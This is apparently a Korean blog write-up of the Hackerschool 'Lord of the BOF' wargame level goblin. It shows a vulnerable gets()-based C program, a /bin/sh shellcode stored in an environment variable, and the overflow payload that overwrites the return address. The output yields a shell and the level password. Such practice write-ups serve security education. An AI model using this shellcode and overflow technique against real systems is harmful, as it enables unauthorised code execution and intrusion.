---
layout: post
title: "Hackerschool LOB-cobolt"
categories: [Hackerschool-LOB]
tags: [pwnable]
redirect_from:
 - /2019/07/28/
---
```bash
login: cobolt
Password:
[cobolt@localhost cobolt]$ ls
goblin  goblin.c
[cobolt@localhost cobolt]$ cat goblin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```
cobolt/hacking exposed로 접속하자.
gremlin과 같이 배열 크기가 작으므로 환경변수를 통해서 풀자.
```bash
export code=$(python -c 'print"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
```
주소를 찾자.
```bash
[cobolt@localhost tmp]$ cat find.c
int main()
{
        printf("%x\n",getenv("code"));
}
[cobolt@localhost tmp]$ ./find
bffff6ec
```
환경변수의 주소값 : bffff6ec
RET까지 거리 : 배열 크기+4=16+4=20
그러므로 20개의 값과 환경변수의 주소값을 넣어주자.
프로그램 실행 후 입력을 받는 형식이므로 ;cat을 사용하는 것을 잊지 말자.
```bash
[cobolt@localhost cobolt]$ (python -c 'print"\x90"*20+"\xec\xf6\xff\xbf"';cat)|./goblin
릱릱릱릱릱릱릱릱릱릱恁?
my-pass
euid = 503
hackers proof
```
cobolt's password : "hackers proof"
